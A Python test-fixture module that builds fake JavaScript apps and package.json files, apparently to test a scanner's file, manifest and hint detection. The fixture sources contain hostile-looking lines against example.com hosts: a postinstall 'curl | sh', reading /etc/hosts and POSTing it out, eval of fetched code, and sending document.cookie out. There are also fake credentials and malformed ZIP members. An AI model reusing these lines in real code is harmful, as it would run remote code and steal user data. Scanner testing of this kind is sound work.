"""Deterministic JavaScript application fixtures; bytes built in code, never real samples.

app_zip() builds a small application archive from declared values, members in central directory order:

    node_modules/left-pad/package.json  deflated; a deeper package.json, never the default one
    node_modules/left-pad/index.js      deflated; the bundled dependency's code
    package.json                        deflated npm manifest with every field the contract lists, and some it does
                                        not (APP_PACKAGE)
    lib/index.js                        deflated CommonJS entry: child_process, fs, an https URL, fetch
    lib/loader.mjs                      stored ES module: eval, new Function, WebSocket, a dynamic import
    src/config.ts                       deflated TypeScript with CRLF line ends: a fake AWS access key id, a private
                                        key block marker, base64 through Buffer.from and atob, a non-ASCII comment
    dist/app.min.js                     deflated; one minified line without a final line feed, the longest line
    lib/util.cjs                        deflated
    lib/Legacy.JS                       deflated; the suffix rule is ASCII case-insensitive
    README.md                           deflated; not a JavaScript file, so never scanned

bundle_js() is one file that is not a ZIP: a webpack-like bundle on one long line, then a source map comment.
package_only() is the app's package.json alone, a single-file input for js.package (file "").
js_edge(kind) builds the clean edge cases of EDGE_KINDS, js_hostile(kind) the problems of HOSTILE_KINDS;
INVALID_JSON names package.json texts a strict RFC 8259 reader refuses, and package_zip(text) puts any of them in an
application ZIP; nested_json(depth) is an object nested to an exact depth for boundary tests.

Each builder returns (data, layout):

    layout["files"]     the JavaScript files by the contract rule (names ending in .js, .mjs, .cjs, .jsx, .ts or
                        .tsx, ASCII case-insensitive, plus package.json; central directory order), each with the
                        js.files row it must produce ("row", including flags), its anchor inside the child and the
                        member's artifact; flagged files instead cite their central entry and have no artifact
    layout["packages"]  every package.json built from declared values, by member name, as layout["package"] is
    layout["package"]   the default package.json (fewest path segments, first in central directory order on a tie):
                        the js.package rows in document order, each with its anchor (offset and length inside the
                        child, quotes included, at most 4,096), and every string value of the document with its JSON
                        pointer and token span ("strings")
    layout["marks"]     per file, named spans of hint-worthy text (labels of this module, not jshints pattern names),
                        so hint tests can pin their own exact matches
    layout["expect"]    hostile and edge cases only: what each js operation must do ("ok", "refused" for a failed
                        operation, "no rows")

Conventions: `lines` counts line feeds, plus one when the last byte is not a line feed (0 when empty);
max_line is the longest run of bytes between line feeds, a carriage return counting as
a byte; JSON depth counts the containers on the path, the outermost included (a bare {} has depth 1); the exports depth
counts the pointer segments after /exports (/exports/./import/node is 3); paths are JSON pointers of the decoded keys
(~ as ~0, / as ~1); values and paths are escaped like import names (printable ASCII as is but the backslash, every
other code point as \\xNN, \\uNNNN or \\UNNNNNNNN) and cut at 256 characters of the escaped text, an escape possibly
split. Secret-looking texts (an AWS access key id, a private key block) are fakes assembled at run time from
fragments, so this source holds no literal a secret scanner would flag.
"""

from __future__ import annotations

import hashlib
import json
import struct

from tests import fixtures_apk as F

JS_SUFFIXES = (".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx")
INSTALL_SCRIPTS = ("preinstall", "install", "postinstall", "prepare")  # npm runs these on install
MAX_ANCHOR = 4096
MAX_TEXT = 256
MAX_JSON_BYTES = 1024 * 1024
MAX_JSON_DEPTH = 64
MAX_EXPORTS_DEPTH = 4
TOP_FIELDS = ("name", "version", "description", "main", "module", "browser", "types", "type", "license", "homepage")
NESTED_FIELDS = ("bin", "scripts", "engines", "dependencies", "devDependencies", "peerDependencies",
                 "optionalDependencies")
BUNDLED_FIELDS = ("bundledDependencies", "bundleDependencies")
# Documented fake values, assembled here so the source holds no secret-looking literal
FAKE_AWS_KEY_ID = "AKIA" + "IOSFODNN7" + "EXAMPLE"
PRIVATE_KEY_BEGIN, PRIVATE_KEY_END = "-----BEGIN " + "PRIVATE KEY-----", "-----END " + "PRIVATE KEY-----"
FAKE_KEY_BODY = "MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7" + "AgEAAkEAreverseaifixturenotakey00"


# ---- expectations shared by every builder ----

def escaped(text):
    """Import-name escaping: printable ASCII as is but the backslash, every other code point as an escape."""
    return "".join(char if " " <= char <= "~" and char != "\\" else
                   ("\\x%02x" if ord(char) <= 0xFF else "\\u%04x" if ord(char) <= 0xFFFF else "\\U%08x") % ord(char)
                   for char in text)


def cut(text):
    """(escaped text cut at 256 characters, whether it was cut)."""
    full = escaped(text)
    return full[:MAX_TEXT], len(full) > MAX_TEXT


def line_metrics(data):
    """(lines, max_line) by the conventions above."""
    if not data:
        return 0, 0
    return data.count(b"\n") + (not data.endswith(b"\n")), max(len(line) for line in data.split(b"\n"))


def is_javascript(name):
    lowered = name.encode("utf-8", "surrogateescape").lower()
    return lowered.endswith(tuple(s.encode() for s in JS_SUFFIXES)) or name.rsplit("/", 1)[-1] == "package.json"


def source(*parts, newline="\n"):
    """(bytes, marks) of lines of text; a (label, text) part inside a line is recorded as a mark at its byte offset.

    parts are lines: a str, or a tuple of str and (label, text) pieces joined without separators."""
    out, marks = bytearray(), []
    for line in parts:
        for piece in (line,) if isinstance(line, str) else line:
            label, text = piece if isinstance(piece, tuple) else (None, piece)
            raw = text.encode("utf-8")
            if label:
                marks.append({"label": label, "text": text, "offset": len(out), "length": len(raw)})
            out += raw
        out += newline.encode()
    return bytes(out), marks


def json_text(value):
    """(bytes, strings) of value as JSON indented by two spaces (keys in the given order, non-ASCII as \\u escapes,
    a final line feed); strings lists every string value with its JSON pointer, the byte span of its token, quotes
    included, and the decoded text."""
    out, strings = [], []
    at = 0

    def put(text):
        nonlocal at
        out.append(text)
        at += len(text)  # ASCII only, so characters are bytes

    def emit(item, pointer, depth):
        if isinstance(item, (dict, list)) and item:
            pairs = list(item.items()) if isinstance(item, dict) else list(enumerate(item))
            put("{\n" if isinstance(item, dict) else "[\n")
            for i, (key, child) in enumerate(pairs):
                put("  " * (depth + 1) + (json.dumps(key) + ": " if isinstance(item, dict) else ""))
                emit(child, pointer + "/" + str(key).replace("~", "~0").replace("/", "~1"), depth + 1)
                put(",\n" if i + 1 < len(pairs) else "\n")
            put("  " * depth + ("}" if isinstance(item, dict) else "]"))
        elif isinstance(item, str):
            token = json.dumps(item)
            strings.append({"pointer": pointer, "offset": at, "length": len(token), "value": item})
            put(token)
        else:
            put(json.dumps(item))

    emit(value, "", 0)
    put("\n")
    return "".join(out).encode("ascii"), strings


def listed(pointer):
    """Whether js.package lists the string at this pointer."""
    segments = pointer.split("/")[1:]
    if not segments or not segments[0]:
        return False
    first = segments[0]
    if len(segments) == 1:
        return first in TOP_FIELDS + ("repository", "bin", "exports")
    if first == "repository":
        return segments == ["repository", "url"]
    if first == "exports":
        return len(segments) - 1 <= MAX_EXPORTS_DEPTH
    if first in BUNDLED_FIELDS:
        return len(segments) == 2
    return first in NESTED_FIELDS


def package_rows(strings, file):
    rows = []
    for item in strings:
        if listed(item["pointer"]):
            value, truncated = cut(item["value"])
            rows.append({"row": {"file": file, "path": escaped(item["pointer"]), "value": value, "truncated": truncated},
                         "offset": item["offset"], "length": min(item["length"], MAX_ANCHOR)})
    return rows


def _segments(name):
    return len(name.split("/"))


def archive(specs, *, strings=None, marks=None):
    """(data, layout) of an application ZIP; specs are fixtures_apk.member() dicts, strings and marks by name."""
    data, zipped = F.zip_archive(specs)
    files = []
    for row in zipped["members"]:
        child = specs[row["index"]]["data"]
        if not is_javascript(row["name"]):
            continue
        lines, max_line = line_metrics(child)
        # an empty member is anchored at its central directory entry in the input, without an artifact
        anchor = ({"offset": 0, "length": min(len(child), MAX_ANCHOR)} if child else
                  {"offset": row["central_offset"], "length": row["central_length"]})
        files.append({"member": row["index"], "name": row["name"], "data": child,
                      "artifact": row["artifact"] if child else None, "anchor": anchor,
                      "row": {"file": escaped(row["name"]), "size": len(child), "sha256": hashlib.sha256(child).hexdigest(),
                              "lines": lines, "max_line": max_line, "flags": []}})
    manifests = [f for f in files if f["name"].rsplit("/", 1)[-1] == "package.json"]
    default = min(manifests, key=lambda f: (_segments(f["name"]), f["member"])) if manifests else None
    packages = {f["name"]: {"name": f["name"], "member": f["member"], "artifact": f["artifact"],
                            "rows": package_rows(strings[f["name"]], f["row"]["file"]), "strings": strings[f["name"]]}
                for f in manifests if f["name"] in (strings or {})}
    return data, {"size": len(data), "sha256": hashlib.sha256(data).hexdigest(), "zip": zipped, "files": files,
                  "packages": packages, "package": packages.get(default["name"]) if default else None,
                  "default_package": default["name"] if default else None,
                  "marks": {name: found for name, found in (marks or {}).items()}}


def single(data, *, strings=None, marks=()):
    """(data, layout) of a single-file input, named "" in rows; an empty input has no rows."""
    lines, max_line = line_metrics(data)
    files = [{"member": None, "name": "", "data": data, "artifact": None,
              "anchor": {"offset": 0, "length": min(len(data), MAX_ANCHOR)},
              "row": {"file": "", "size": len(data), "sha256": hashlib.sha256(data).hexdigest(), "lines": lines,
                      "max_line": max_line, "flags": []}}] if data else []
    package = None if strings is None else {"name": "", "member": None, "artifact": None,
                                            "rows": package_rows(strings, ""), "strings": strings}
    return data, {"size": len(data), "sha256": hashlib.sha256(data).hexdigest(), "zip": None, "files": files,
                  "packages": {} if package is None else {"": package}, "package": package,
                  "default_package": "" if strings is not None else None,
                  "marks": {"": list(marks)}}


# ---- the application ----

APP_PACKAGE = {
    "name": "@fixture/app",
    "version": "1.4.2",
    "description": "Fixture application: caf\u00e9 \U0001F600, \"quoted\", C:\\tmp",
    "main": "lib/index.js",
    "module": "lib/loader.mjs",
    "types": "src/config.ts",
    "type": "commonjs",
    "license": "MIT",
    "homepage": "https://app.example.com/",
    "repository": {"type": "git", "url": "git+https://git.example.com/fixture/app.git"},
    "bin": {"fixture-app": "lib/index.js", "fixture-load": "lib/loader.mjs"},
    "exports": {
        ".": {"import": {"node": "./lib/loader.mjs", "default": "./dist/app.min.js"}, "require": "./lib/index.js"},
        "./four": {"a": {"b": {"c": "./four.js"}}},
        "./five": {"a": {"b": {"c": {"d": "./five.js"}}}},
    },
    "scripts": {"preinstall": "node lib/index.js --check",
                "postinstall": "node lib/index.js --setup && curl -s https://cdn.example.com/i.sh | sh",
                "prepare": "tsc -p .", "build": "tsc", "test": "node --test"},
    "engines": {"node": ">=18"},
    "dependencies": {"left-pad": "^1.3.0", "@scope/pkg": "git+https://git.example.com/scope/pkg.git",
                     "local-lib": "file:../local-lib"},
    "devDependencies": {"typescript": "5.6.3", "tilde~name": "1.0.0"},
    "peerDependencies": {"react": ">=18"},
    "optionalDependencies": {"fsevents": "2.3.3"},
    "bundledDependencies": ["left-pad"],
    "private": False,
    "keywords": ["fixture", "m5a"],
    "config": {"port": "8080"},
}
# The js.package rows of APP_PACKAGE in document order, written out as the contract reads them
APP_PACKAGE_PATHS = (
    "/name", "/version", "/description", "/main", "/module", "/types", "/type", "/license", "/homepage",
    "/repository/url", "/bin/fixture-app", "/bin/fixture-load", "/exports/./import/node", "/exports/./import/default",
    "/exports/./require", "/exports/.~1four/a/b/c", "/scripts/preinstall", "/scripts/postinstall", "/scripts/prepare",
    "/scripts/build", "/scripts/test", "/engines/node", "/dependencies/left-pad", "/dependencies/@scope~1pkg",
    "/dependencies/local-lib", "/devDependencies/typescript", "/devDependencies/tilde~0name", "/peerDependencies/react",
    "/optionalDependencies/fsevents", "/bundledDependencies/0",
)
LEFT_PAD_PACKAGE = {"name": "left-pad", "version": "1.3.0", "main": "index.js", "license": "WTFPL"}


def _index_js():
    return source(
        "'use strict';",
        "// Fixture entry point (CommonJS), built in code for ReverseAI tests; never run",
        ("const { exec } = ", ("require_child_process", "require('child_process')"), ";"),
        ("const fs = ", ("require_fs", "require('fs')"), ";"),
        ("const ENDPOINT = '", ("url_https", "https://api.example.com/v1/collect"), "';"),
        "function setup() {",
        ("  ", ("exec_call", "exec("), "'id && uname -a', () => {});"),
        ("  const hosts = ", ("read_file", "fs.readFileSync("), "'", ("path_etc", "/etc/hosts"), "', 'utf8');"),
        ("  return ", ("fetch_call", "fetch("), "ENDPOINT, { method: 'POST', body: hosts });"),
        "}",
        "module.exports = { setup };",
    )


def _loader_mjs():
    return source(
        "// Fixture ES module; never run",
        "export async function load(name) {",
        ("  const response = await ", ("fetch_call", "fetch("), "'", ("url_http", "http://cdn.example.com/plugins/"),
         "' + name + '.js');"),
        "  const code = await response.text();",
        ("  ", ("eval_call", "eval("), "code);"),
        ("  const make = ", ("new_function", "new Function("), "'a', 'b', 'return a + b');"),
        ("  const socket = ", ("websocket", "new WebSocket("), "'", ("url_wss", "wss://ws.example.com/live"), "');"),
        ("  return ", ("dynamic_import", "import("), "'./plugins/' + name + '.mjs');"),
        "}",
    )


def _config_ts():
    return source(
        "// Fixture configuration (TypeScript), caf\u00e9; the credentials below are fakes",
        ("export const awsKeyId: string = '", ("aws_key_id", FAKE_AWS_KEY_ID), "';"),
        ("export const privateKey: string = `", ("private_key", PRIVATE_KEY_BEGIN), ""),
        FAKE_KEY_BODY,
        PRIVATE_KEY_END + "`;",
        ("export const token = ", ("buffer_from", "Buffer.from("), "'", ("base64_text", "cmV2ZXJzZWFpIGZpeHR1cmU="),
         "', ", ("base64_encoding", "'base64'"), ").toString();"),
        ("export const decoded = ", ("atob_call", "atob("), "'aGVsbG8=');"),
        newline="\r\n",
    )


def _app_min_js():
    functions = ";".join(f"function f{i}(a,b){{return a*{i}+b}}" for i in range(40))
    data, marks = source(("!function(){", functions, ";var x=", ("xhr", "new XMLHttpRequest("), ");x.open('POST','",
                          ("url_https", "https://telemetry.example.com/t"), "');x.send(", ("document_cookie", "document.cookie"),
                          ");", ("local_storage", "localStorage"), ".setItem('k','v')}();"))
    return data[:-1], marks  # one line without a final line feed


def app_zip():
    package, strings = json_text(APP_PACKAGE)
    left_pad, left_pad_strings = json_text(LEFT_PAD_PACKAGE)
    index, index_marks = _index_js()
    loader, loader_marks = _loader_mjs()
    config, config_marks = _config_ts()
    minified, minified_marks = _app_min_js()
    util, util_marks = source(("module.exports = { now: () => ", ("date_now", "Date.now()"), " };"))
    legacy, _ = source("var legacy = 1;")
    readme, _ = source("# Fixture app", "", "Not JavaScript: eval( and https://docs.example.com/ here are never scanned.")
    left_pad_index, _ = source("module.exports = function leftPad(s, n) { return String(s).padStart(n); };")
    specs = [F.member("node_modules/left-pad/package.json", left_pad), F.member("node_modules/left-pad/index.js",
                                                                              left_pad_index),
             F.member("package.json", package), F.member("lib/index.js", index), F.member("lib/loader.mjs", loader, 0),
             F.member("src/config.ts", config), F.member("dist/app.min.js", minified), F.member("lib/util.cjs", util),
             F.member("lib/Legacy.JS", legacy), F.member("README.md", readme)]
    return archive(specs, strings={"package.json": strings, "node_modules/left-pad/package.json": left_pad_strings},
                   marks={"lib/index.js": index_marks, "lib/loader.mjs": loader_marks, "src/config.ts": config_marks,
                          "dist/app.min.js": minified_marks, "lib/util.cjs": util_marks})


def bundle_js():
    blob = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0h" * 2
    data, marks = source(
        "/*! fixture bundle, built in code for ReverseAI tests; never run */",
        ("(()=>{var m={101:(e,t,n)=>{e.exports=", ("eval_call", "eval("), "\"2+2\")},202:e=>{e.exports=",
         ("atob_call", "atob("), "\"cmV2ZXJzZWFp\")}};var c=", ("require_child_process", "require(\"child_process\")"),
         ";c.", ("exec_call", "execSync("), "\"whoami\");", ("fetch_call", "fetch("), "\"",
         ("url_https", "https://collect.example.com/b?id="), "\"+", ("document_cookie", "document.cookie"),
         ");var blob=\"", ("base64_blob", blob), "\";", ("new_function", "new Function("), "blob)})();"),
        (("source_map", "//# sourceMappingURL=bundle.js.map"),),
    )
    return single(data, marks=marks)


def package_only():
    data, strings = json_text(APP_PACKAGE)
    return single(data, strings=strings)


# ---- edge and hostile cases ----

EDGE_KINDS = ("long_value", "package_tie", "empty_file", "empty_input")
HOSTILE_KINDS = ("duplicate_key", "duplicate_nested_key", "invalid_json", "deep_nesting", "huge_string", "non_utf8",
                 "long_pointer", "flagged_members", "declared_over_128mib", "zip_refused")
INVALID_JSON = {
    "trailing_comma": b'{"name": "a",}',
    "single_quotes": b"{'name': 'a'}",
    "comment": b'{"name": "a" // note\n}',
    "nan": b'{"version": NaN}',
    "control_character": b'{"name": "a\tb"}',
    "lone_surrogate": b'{"name": "\\ud800"}',
    "bad_escape": b'{"name": "\\q"}',
    "leading_zero": b'{"version": 01}',
    "truncated": b'{"name": "a"',
    "two_values": b'{"name": "a"} {}',
    "empty": b"",
    "bare_word": b"package",
    "byte_order_mark": b'\xef\xbb\xbf{"name": "a"}',  # A UTF-8 BOM is refused
    "top_level_array": b'["name"]',  # the file must hold one JSON object
    "top_level_string": b'"name"',
}
INDEX_JS = b"module.exports = 1;\n"


def nested_json(depth):
    """{"a": [[...]]} with exactly depth containers on the innermost path, the outer object counted."""
    if depth < 1:
        raise ValueError("depth starts at 1")
    return b'{"a": ' + b"[" * (depth - 1) + b"]" * (depth - 1) + b"}" if depth > 1 else b"{}"


def package_zip(text, *, method=8, extra=()):
    """An application ZIP of package.json with these exact bytes, lib/index.js and any extra members."""
    return archive([F.member("package.json", text, method), F.member("lib/index.js", INDEX_JS), *extra])


def js_edge(kind):
    if kind == "long_value":
        # A value longer than both the 256-character cut and the 4,096-byte anchor
        data, strings = json_text({"name": "long", "description": "d" * 5000 + "\u00e9"})
        built = archive([F.member("package.json", data)], strings={"package.json": strings})
        built[1]["expect"] = {"js.package": "ok"}
        return built
    if kind == "package_tie":
        # Same segment count: the first in central directory order is the default, whatever its name
        first, first_strings = json_text({"name": "second-by-name"})
        second, second_strings = json_text({"name": "first-by-name"})
        built = archive([F.member("b/package.json", first), F.member("a/package.json", second)],
                        strings={"b/package.json": first_strings, "a/package.json": second_strings})
        built[1]["expect"] = {"js.package": "ok", "default": "b/package.json"}
        return built
    if kind == "empty_file":
        # An empty member is anchored at its central directory entry, without an artifact
        built = archive([F.member("lib/empty.js", b"", 0), F.member("lib/index.js", INDEX_JS)])
        built[1]["expect"] = {"js.files": "ok", "js.hints": "ok"}
        return built
    if kind == "empty_input":
        # An empty single-file input has no rows
        built = single(b"")
        built[1]["expect"] = {"js.files": "no rows", "js.hints": "no rows"}
        return built
    raise ValueError(f"unknown edge kind {kind!r}")


def _flagged_files(layout, flags):
    layout["flags"] = flags
    for file in layout["files"]:
        member = layout["zip"]["members"][file["member"]]
        refused = flags[file["member"]]
        if refused:
            file.update(artifact=None, anchor={"offset": member["central_offset"],
                                              "length": min(member["central_length"], MAX_ANCHOR)})
            file["row"].update(file=escaped(file["name"])[:255], size=member["size"], sha256=None,
                               lines=None, max_line=None, flags=refused)


def js_hostile(kind):
    """(data, layout) of one problem; layout["expect"] maps each js operation to "ok", "refused" or "no rows"."""
    if kind == "duplicate_key":
        built = package_zip(b'{\n  "name": "a",\n  "name": "b"\n}\n')
    elif kind == "duplicate_nested_key":
        built = package_zip(b'{"name": "a", "dependencies": {"left-pad": "1.0.0", "left-pad": "9.9.9"}}\n')
    elif kind == "invalid_json":
        built = package_zip(INVALID_JSON["trailing_comma"])
    elif kind == "deep_nesting":
        # Far past depth 64: a recursive reader without a bound would overflow its stack
        built = package_zip(nested_json(100_000), method=0)
    elif kind == "huge_string":
        # One string makes the document a byte longer than the 1 MiB the reader accepts
        head, tail = b'{"name": "huge", "description": "', b'"}\n'
        built = package_zip(head + b"x" * (MAX_JSON_BYTES + 1 - len(head) - len(tail)) + tail, method=0)
    elif kind == "non_utf8":
        latin1, marks = source(("var s = \"caf", ("raw_byte", "\u00e9"), "\";"),
                               ("fetch(\"", ("url_https", "https://latin1.example.com/x"), "\");"))
        latin1 = latin1.replace("\u00e9".encode(), b"\xe9")  # one byte shorter: offsets after it move back by one
        for mark in marks:
            if mark["label"] == "raw_byte":
                mark.update(length=1, text=None, bytes=b"\xe9")
            elif mark["offset"] > marks[0]["offset"]:
                mark["offset"] -= 1
        built = package_zip(b'{"name": "caf\xe9"}\n', extra=(F.member("lib/latin1.js", latin1),))
        built[1]["marks"] = {"lib/latin1.js": marks}
        built[1]["expect"] = {"js.files": "ok", "js.package": "refused", "js.hints": "ok"}
        return built
    elif kind == "long_pointer":
        # A JSON pointer longer than 255 characters fails js.package
        built = package_zip(b'{"name": "a", "dependencies": {"' + b"k" * 300 + b'": "1.0.0"}}\n')
    elif kind == "flagged_members":
        # All JS names are listed; flagged members are never read.
        package, strings = json_text({"name": "flagged"})
        specs = [F.member("package.json", package), F.member("ok.js", INDEX_JS),
                 F.member("../escape.js", INDEX_JS), F.member("../package.json", b'{"name": "outside"}'),
                 F.member("link.js", b"ok.js", 0, made_by=F.MADE_BY_UNIX, external_attr=0o120777 << 16),
                 F.member("locked.js", INDEX_JS, flags=F.ENCRYPTED),
                 F.member("dup.js", INDEX_JS), F.member("dup.js", b"var other = 2;\n"),
                 F.member("packed.js", INDEX_JS, 12), F.member("x" * 256 + ".js", INDEX_JS)]
        data, layout = archive(specs, strings={"package.json": strings})
        flags = {"../escape.js": ["traversing_name"], "../package.json": ["traversing_name"], "link.js": ["symlink"],
                 "locked.js": ["encrypted"], "dup.js": ["duplicate_name"], "packed.js": ["unsupported_method"],
                 "x" * 256 + ".js": ["long_name"]}
        _flagged_files(layout, [flags.get(row["name"], []) for row in layout["zip"]["members"]])
        layout["expect"] = {"js.files": "ok", "js.package": "ok", "js.hints": "ok"}
        return data, layout
    elif kind == "declared_over_128mib":
        # Five deflated members each declaring 30 MiB (150 MiB in all): the APK parser flags every member too_large
        # (and ratio), so no JavaScript is read
        specs = [F.member(f"part{i}.js", INDEX_JS) for i in range(5)]
        data, layout = archive(specs)
        patched = bytearray(data)
        for row in layout["zip"]["members"]:
            struct.pack_into("<I", patched, row["local_header_offset"] + 22, 30 * 1024 * 1024)
            struct.pack_into("<I", patched, row["central_offset"] + 24, 30 * 1024 * 1024)
            row["size"] = 30 * 1024 * 1024
        data = bytes(patched)
        _flagged_files(layout, [["ratio", "too_large"] for _ in specs])
        layout.update(size=len(data), sha256=hashlib.sha256(data).hexdigest(),
                      expect={"js.files": "ok", "js.package": "no rows", "js.hints": "no rows"})
        return data, layout
    elif kind == "zip_refused":
        # It starts with a ZIP local header but the parser refuses it (ZIP64), so every js
        # operation fails; it is never read as one script
        data, zipped = F.zip_archive([F.member("lib/index.js", INDEX_JS)], zip64=True)
        return data, {"size": len(data), "sha256": hashlib.sha256(data).hexdigest(), "zip": zipped, "files": [],
                      "packages": {}, "package": None, "default_package": None, "marks": {},
                      "expect": {"js.files": "refused", "js.package": "refused", "js.hints": "refused"}}
    else:
        raise ValueError(f"unknown hostile kind {kind!r}")
    built[1]["expect"] = {"js.files": "ok", "js.package": "refused", "js.hints": "ok"}
    return built
